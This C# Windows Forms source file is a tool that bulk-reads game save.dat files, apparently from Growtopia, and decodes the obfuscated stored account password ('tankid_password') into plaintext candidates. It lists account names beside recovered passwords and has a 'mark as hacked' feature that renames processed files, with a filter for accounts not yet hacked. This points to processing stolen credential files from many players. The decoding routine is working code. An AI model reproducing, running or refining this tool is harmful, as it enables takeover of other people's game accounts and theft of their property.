using System;
using System.Collections.Generic;
using System.Drawing;
using System.IO;
using System.Text;
using System.Text.RegularExpressions;
using System.Windows.Forms;

namespace simplesavedatadecryptorbyracest
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }
        public class PasswordDec
        {
            public List<string> PPW(byte[] contents)
            {
                List<string> result;
                try
                {
                    string text = "";
                    for (int i = 0; i < contents.Length; i += 1)
                    {
                        byte b = contents[i];
                        string text2 = b.ToString("X2");
                        bool flag = text2 == "00";
                        if (flag)
                        {
                            text += "<>";
                        }
                        else
                        {
                            text += text2;
                        }
                    }
                    bool flag2 = text.Contains("74616E6B69645F70617373776F7264");
                    if (flag2)
                    {
                        string text3 = "74616E6B69645F70617373776F7264";
                        int num = text.IndexOf(text3);
                        int num2 = text.LastIndexOf(text3);
                        bool flag3 = false;
                        string text4;
                        if (flag3)
                        {
                            text4 = string.Empty;
                        }
                        num += text3.Length;
                        int num3 = text.IndexOf("<><><>", num);
                        bool flag4 = false;
                        if (flag4)
                        {
                            text4 = string.Empty;
                        }

                        string @string = Encoding.UTF8.GetString(StringToByteArray(text.Substring(num, num3 - num).Trim()));
                        bool flag5 = ((@string.ToCharArray()[0] == 95) ? 1 : 0) == 0;
                        if (flag5)
                        {
                            text4 = text.Substring(num, num3 - num).Trim();
                        }
                        else
                        {
                            num2 += text3.Length;
                            num3 = text.IndexOf("<><><>", num2);
                            text4 = text.Substring(num2, num3 - num2).Trim();
                        }
                        string text5 = "74616E6B69645F70617373776F7264" + text4 + "<><><>";
                        int num4 = text.IndexOf(text5);
                        bool flag6 = false;
                        string text6;
                        if (flag6)
                        {
                            text6 = string.Empty;
                        }
                        num4 += text5.Length;
                        int num5 = text.IndexOf("<><><>", num4);
                        bool flag7 = false;
                        if (flag7)
                        {
                            text6 = string.Empty;
                        }

                        text6 = text.Substring(num4, num5 - num4).Trim();
                        int num6 = StringToByteArray(text4)[0];
                        text6 = text6.Substring(0, num6 * 2);
                        byte[] array = StringToByteArray(text6.Replace("<>", "00"));
                        List<byte> list = new List<byte>();
                        List<byte> list2 = new List<byte>();
                        byte b2 = (byte)(48 - array[0]);
                        byte[] array2 = array;
                        for (int j = 0; j < array2.Length; j += 1)
                        {
                            byte b3 = array2[j];
                            list.Add((byte)(b2 + b3));
                        }
                        for (int k = 0; k < list.Count; k += 1)
                        {
                            list2.Add((byte)(list[k] - 1 - k));
                        }
                        List<string> list3 = new List<string>();
                        int num7 = 0;
                        while ((num7 > 255 ? 1 : 0) == 0)
                        {
                            string text7 = "";
                            foreach (byte b4 in list2)
                            {
                                bool flag8 = ValidateChar((char)((byte)((int)b4 + num7)));
                                if (flag8)
                                {
                                    text7 += ((char)((byte)((int)b4 + num7))).ToString();
                                }
                            }
                            bool flag9 = text7.Length == num6;
                            if (flag9)
                            {
                                list3.Add(text7);
                            }
                            num7 += 1;
                        }
                        result = list3;
                    }
                    else
                    {
                        result = null;
                    }
                }
                catch
                {
                    result = null;
                }
                return result;
            }
            public byte[] StringToByteArray(string str)
            {
                Dictionary<string, byte> hexindex = new Dictionary<string, byte>();
                for (int i = 0; i <= 255; i++)
                    hexindex.Add(i.ToString("X2"), (byte)i);

                List<byte> hexres = new List<byte>();
                for (int i = 0; i < str.Length; i += 2)
                    hexres.Add(hexindex[str.Substring(i, 2)]);

                return hexres.ToArray();
            }
            private bool ValidateChar(char cdzdshr)
            {
                if ((cdzdshr >= 0x30 && cdzdshr <= 0x39) ||
                        (cdzdshr >= 0x41 && cdzdshr <= 0x5A) ||
                        (cdzdshr >= 0x61 && cdzdshr <= 0x7A) ||
                        (cdzdshr >= 0x2B && cdzdshr <= 0x2E)) return true;
                else return false;
            }

            public string[] Func(byte[] lel)
            {
                byte[] buff = lel;
                var passwords = PPW(buff);
                return passwords.ToArray();
            }
        }
        Random rastgele = new Random();
        public string savedataspath;
        bool showonlynhacked = false;
        private void button1_Click(object sender, EventArgs e)
        {
            if (savedataspath == null)
            {
                MessageBox.Show("please select folder that contains your savedats.");
                return;
            }
            var pattern = new Regex(@"[^\w0-9]");
            string contents;
            int failedcount = 0;
            foreach (string file in Directory.EnumerateFiles(savedataspath, "*.dat"))
            {
                try
                {
                    string status = "FALSE";
                    string filename = Path.GetFileName(file);
                    if (filename.Contains("hackedtrue"))
                        status = "TRUE";
                    var r = File.Open(file, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
                    using (FileStream fileStream = new FileStream(file, FileMode.Open, FileAccess.Read, FileShare.ReadWrite))
                    {
                        using (StreamReader streamReader = new StreamReader(fileStream, Encoding.Default))
                        {
                            contents = streamReader.ReadToEnd();
                        }
                    }
                    string cleardata = contents.Replace("\u0000", " ");
                    string growid = pattern.Replace(cleardata.Substring(cleardata.IndexOf("tankid_name") + "tankid_name".Length).Split(' ')[3], string.Empty);
                    string[] passwords = new PasswordDec().Func(Encoding.Default.GetBytes(contents));
                    string str1 = "";
                    foreach (string str3 in passwords)
                        str1 = str1 + str3 + Environment.NewLine;
                    string[] arr1 = new string[4];
                    arr1[0] = status;
                    arr1[1] = growid;
                    arr1[2] = str1;
                    arr1[3] = filename;
                    ListViewItem itm1;
                    itm1 = new ListViewItem(arr1);
                    listView1.Items.Add(itm1);
                }
                catch { ++failedcount; }
            }
            if (failedcount != 0 )
                MessageBox.Show("failed count " + failedcount);
        }
        private void listView1_SelectedIndexChanged(object sender, EventArgs e)
        {
            if (listView1.SelectedItems.Count == 0)
                return;
            ListViewItem item = listView1.SelectedItems[0];
            richTextBox1.Text = item.SubItems[2].Text;
            growid.Text = item.SubItems[1].Text;
        }

        private void markAsHackedToolStripMenuItem_Click(object sender, EventArgs e)
        {
            int sayi = rastgele.Next(10, 100000);
            if (listView1.SelectedItems.Count == 0)
                return;
            ListViewItem item = listView1.SelectedItems[0];
            if (item.SubItems[0].Text == "FALSE")
            {
                try
                {
                    File.Move((savedataspath + "/" + item.SubItems[3].Text), (savedataspath + "/" + sayi + "hackedtrue.dat"));
                    item.SubItems[0].Text = "TRUE";
                    if (showonlynhacked)
                    item.ForeColor = Color.Black;
                }
                catch { MessageBox.Show("error while marking account as hacked."); }
            }
            else
                item.SubItems[0].Text = "FALSE";
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            savedats.Text = savedataspath;
        }

        private void button2_Click(object sender, EventArgs e)
        {
            FolderBrowserDialog fbd = new FolderBrowserDialog();
            fbd.Description = "Custom Description";

            if (fbd.ShowDialog() == DialogResult.OK)
            {
                savedataspath = fbd.SelectedPath;
                savedats.Text = savedataspath;
            }
        }

        private void button3_Click(object sender, EventArgs e)
        {
            listView1.Items.Clear();
        }

        private void button4_Click(object sender, EventArgs e)
        {
                foreach (ListViewItem item in listView1.Items)
                {
                if (item.SubItems[0].Text == "TRUE")
                {
                    if (!showonlynhacked)
                    {
                        item.ForeColor = Color.Black;
                    }
                    else
                    {
                         item.ForeColor = Color.White;
                    }
                }
                }
            if (showonlynhacked == false)
                showonlynhacked = true;
            else
                showonlynhacked = false;
        }
        }
    }
